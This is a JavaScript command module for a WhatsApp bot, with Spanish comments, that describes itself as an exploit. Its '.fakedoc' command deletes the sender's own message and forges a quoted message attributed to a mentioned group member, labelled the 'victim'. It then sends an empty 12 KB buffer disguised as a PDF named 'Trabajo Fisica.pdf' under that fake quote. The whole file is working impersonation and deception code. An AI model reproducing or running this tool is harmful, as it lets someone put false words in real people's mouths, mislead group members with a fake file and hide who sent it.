export default {
    name: 'suplantacion_documento',
    match: (text) => /^\.fakedoc\s+/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Este exploit solo tiene sentido en grupos." }, { quoted: msg });

        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Menciona a la víctima. Ej: .fakedoc @user pásame el archivo" });

        // Si no pones texto, por defecto la víctima pedirá el trabajo
        let textoFalso = textoLimpio.replace(/^\.fakedoc\s+/i, '').replace(/@\d+/g, '').trim();
        if (!textoFalso) textoFalso = "¿Tienes el trabajo de física listo?";

        try {
            // 1. Destrucción de la evidencia
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción de la cita fantasma
            const mensajeInyectado = {
                key: {
                    fromMe: false,
                    participant: mentionedJid,
                    id: "3EB0" + Date.now().toString(16).toUpperCase()
                },
                message: { conversation: textoFalso }
            };

            // 3. Generación del documento corrupto en RAM
            // Asignamos 12 KB de datos vacíos para que el archivo parezca tener contenido real
            const corruptBuffer = Buffer.alloc(12 * 1024);

            // 4. Ejecución: Envío exclusivo del archivo (sin texto, sin enlaces)
            await sock.sendMessage(remitente, { 
                document: corruptBuffer,
                fileName: "Trabajo Fisica.pdf",
                mimetype: "application/pdf"
                // No se incluye la propiedad 'caption', por lo que va sin texto
            }, { 
                quoted: mensajeInyectado 
            });

        } catch (err) {
            console.error("Error Fake Doc:", err);
            await sock.sendMessage(remitente, { text: `❌ Fallo en la inyección del documento: ${err.message}` });
        }
    }
};
